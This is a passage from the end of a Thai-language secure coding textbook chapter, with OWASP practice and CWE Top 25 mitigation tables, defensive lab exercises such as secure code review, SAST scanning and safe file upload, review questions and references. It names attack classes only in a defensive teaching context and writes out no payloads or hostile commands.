- [ ] Mask ข้อมูลที่ละเอียดอ่อน
- [ ] Log Rotation และ Retention Policy
- [ ] Access Control สำหรับ Log Files

#### 9.7.2 Top Secure Coding Practices (OWASP)

| ลำดับ | แนวปฏิบัติ | รายละเอียด |
|:----:|-----------|-----------|
| 1 | Validate Input จากทุกแหล่ง | HTTP Request, File, DB, API, Environment Variables |
| 2 | Output Encode ตาม Context | HTML Entity, URL Encoding, JavaScript Unicode Escaping |
| 3 | Parameterize Database Queries | Prepared Statements, ORM |
| 4 | Authentication และ Session Management ที่ปลอดภัย | JWT, OAuth 2.0, HTTP-Only Cookies |
| 5 | Access Control ทุกระดับ | Endpoint Level + Data Level |
| 6 | Cryptography Practices | AES-GCM, Argon2, ไม่ Roll Your Own Crypto |
| 7 | Error Handling ที่ปลอดภัย | Centralized Handler, No Stack Trace Leak |
| 8 | Secure File Management | File Type Validation, Path Traversal Prevention |
| 9 | Secure Logging | Mask Sensitive Data, Centralized Logging |
| 10 | Dependency Management | SCA, Update Libraries, Remove Unused Dependencies |

#### 9.7.3 CWE Top 25 Mapping (2025)

| CWE | Secure Coding Practice ที่เกี่ยวข้อง |
|:---:|-------------------------------------|
| CWE-79 (XSS) | Output Encoding, CSP |
| CWE-89 (SQL Injection) | Parameterized Query |
| CWE-352 (CSRF) | Anti-CSRF Token, SameSite Cookie |
| CWE-862 (Missing Authorization) | Access Control ทุกระดับ |
| CWE-787 (Out-of-bounds Write) | Bounds Checking, Memory-safe Language |
| CWE-22 (Path Traversal) | Path Canonicalization |
| CWE-416 (Use After Free) | Memory-safe Language, Smart Pointers |
| CWE-125 (Out-of-bounds Read) | Bounds Checking, Memory-safe Language |
| CWE-78 (OS Command Injection) | Avoid Shell Command, Input Validation |
| CWE-94 (Code Injection) | Input Validation, Safe Eval |
| CWE-120/121/122 (Buffer Overflow) | Memory-safe Language, Stack Canary, ASLR, DEP |
| CWE-434 (File Upload) | File Type Validation, Magic Number |
| CWE-476 (NULL Pointer Dereference) | Null Check ก่อน Dereference |
| CWE-502 (Deserialization) | Input Validation, Allowlist Classes |
| CWE-20 (Input Validation) | Input Validation ทุกแหล่ง |
| CWE-284 (Improper Access Control) | Access Control, Default Deny |
| CWE-200 (Information Exposure) | Error Handling, Log Sanitization |
| CWE-306 (Missing Authentication) | Authentication ทุก Endpoint |
| CWE-918 (SSRF) | URL Validation, Allowlist |
| CWE-77 (Command Injection) | Avoid Shell Command, Input Validation |
| CWE-770 (Resource Exhaustion) | Rate Limiting, Resource Quotas |

---

## Keywords

Secure Coding, Defensive Programming, Input Validation, Output Encoding, Exception Handling, Stack Trace, Global Error Handler, Memory Safety, Buffer Overflow, Stack Canary, ASLR, DEP, Use-after-Free, Dangling Pointer, Format String, Path Traversal, File Upload, TOCTOU, Race Condition, Log Sanitization, Logging, CWE Top 25, OWASP Secure Coding, CERT/SEI, Fail Safe, Fail Fast, Immutable Object, Defensive Copying, Memory-safe Language, Resource Leak

---

## กิจกรรมปฏิบัติการ

### Lab 9.1: Secure Code Review
- ตรวจสอบ Source Code ที่มี Intentional Vulnerabilities (จาก GitHub: OWASP/NodeGoat, OWASP/WebGoat)
- ระบุช่องโหว่ CWE แต่ละรายการ พร้อมบรรทัดที่พบ และระดับความรุนแรง
- เสนอแนวทางแก้ไขและเขียนโค้ดที่ปลอดภัย

### Lab 9.2: ใช้ SAST Tools สแกนหาช่องโหว่
- ติดตั้งและใช้งาน Semgrep, Snyk, หรือ CodeQL
- สแกนตัวอย่างโค้ดที่มี Intentional Vulnerabilities
- วิเคราะห์ผลลัพธ์: False Positive / True Positive
- เปรียบเทียบความสามารถของ SAST Tools แต่ละตัว

### Lab 9.3: Secure File Upload
- Implement File Upload Function ที่ปลอดภัย
- ตรวจสอบ File Type ด้วย Magic Number (ไม่ใช่แค่ Extension)
- จำกัดขนาดไฟล์ และ Sanitize ชื่อไฟล์
- จัดเก็บไฟล์นอก Web Root และ Serve ผ่าน Script
- ทดสอบ Path Traversal, Double Extension, และ Null Byte Injection

### Lab 9.4: Exception Handling และ Secure Logging
- เขียน Global Error Handler ที่ไม่รั่วไหลข้อมูล
- สร้าง Custom Error Pages (404, 500, 403)
- Implement Log Sanitization — Mask รหัสผ่านและข้อมูลสำคัญ
- ตั้งค่า Log Rotation และ File Permission

---

## คำถามท้ายบท

1. Defensive Programming คืออะไร และแตกต่างจากการเขียนโปรแกรมทั่วไปอย่างไร? ยกตัวอย่างหลักการที่สำคัญ 3 ข้อ
2. Immutable Objects ช่วยป้องกันช่องโหว่ด้านความปลอดภัยได้อย่างไร? จงอธิบายพร้อมตัวอย่างโค้ด
3. เหตุใดการแสดง Stack Trace ให้ผู้ใช้เห็นจึงไม่ปลอดภัย? ข้อมูลใดบ้างที่อาจรั่วไหลจาก Stack Trace?
4. Buffer Overflow เกิดขึ้นได้อย่างไร? จงอธิบายกลไก Stack Canary, ASLR, และ DEP ว่าป้องกัน Buffer Overflow อย่างไร
5. ภาษา Rust ป้องกัน Use-after-Free และ Dangling Pointer ได้อย่างไรเมื่อเทียบกับภาษา C/C++?
6. Path Traversal (CWE-22) คืออะไร? จงอธิบายวิธีการป้องกัน 3 วิธีพร้อมตัวอย่างโค้ด
7. File Upload มีความเสี่ยงอะไรบ้าง? จงอธิบายมาตรการป้องกันแบบ Defense in Depth
8. TOCTOU (Time of Check, Time of Use) Race Condition คืออะไร? แตกต่างจาก Race Condition ทั่วไปอย่างไร?
9. ข้อมูลประเภทใดบ้างที่ไม่ควรบันทึกใน Log? จงอธิบายเทคนิค Log Sanitization และ Masking พร้อมตัวอย่าง
10. Fail Fast และ Fail Safe แตกต่างกันอย่างไร? ในบริบทความปลอดภัย แนวทางใดเหมาะสมกับ Production มากกว่ากัน?
11. Integer Overflow อาจนำไปสู่ช่องโหว่ด้านความปลอดภัยได้อย่างไร? จงยกตัวอย่างสถานการณ์จริง
12. Centralized Logging และ Log Retention มีความสำคัญอย่างไรในมุมมอง Security Operations?
13. ถ้านักพัฒนาพบว่ามี Hardcoded Database Credentials ใน Source Code ที่ commit ไปแล้ว ควรดำเนินการอย่างไร?
14. OWASP Top 10 Proactive Controls (2024) มีอะไรบ้าง? จงเลือกมา 5 ข้อที่คิดว่าสำคัญที่สุดพร้อมเหตุผล

---

## เอกสารอ้างอิง

1. OWASP Developer Guide (เดิม OWASP Secure Coding Practices — ถูก Archive แล้ว)
2. OWASP Top 10 Proactive Controls v4.0.0 (2024)
3. SEI CERT Coding Standards — Carnegie Mellon University
4. CWE Top 25 Most Dangerous Software Weaknesses — MITRE (2025)
5. NIST SP 800-218 — Secure Software Development Framework (SSDF) v1.1
6. NSA + CISA (2025). *Memory Safe Languages: Reducing Vulnerabilities in Modern Software Development*
7. NSA (2022). *Software Memory Safety*
8. White House (2024). *Back to the Building Blocks: A Call for Memory Safe Software*
9. Seacord, R. (2013). *Secure Coding in C and C++* (2nd ed.). Addison-Wesley
10. Long, F. et al. (2022). *Java Coding Guidelines: 75 Recommendations for Reliable and Secure Programs*
11. The Rust Programming Language — Chapter 4: Ownership
12. Microsoft SDL — Security Development Lifecycle Practices
13. OWASP ASVS (Application Security Verification Standard) v4.0.3
14. OWASP Cheat Sheet Series — File Upload, Logging, Error Handling
15. MITRE CWE — CWE-134: Format String Vulnerability
16. MITRE CWE — CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
17. MITRE CWE — CWE-416: Use After Free
18. MITRE CWE — CWE-787: Out-of-bounds Write
19. Google Security Blog — Android Memory Safety (2025)
20. Microsoft Security Response Center (MSRC) — Annual Vulnerability Report
21. Shostack, A. (2014). *Threat Modeling: Designing for Security*. Wiley
22. Open Source Security Foundation (OpenSSF) — Secure Coding Practices Guide
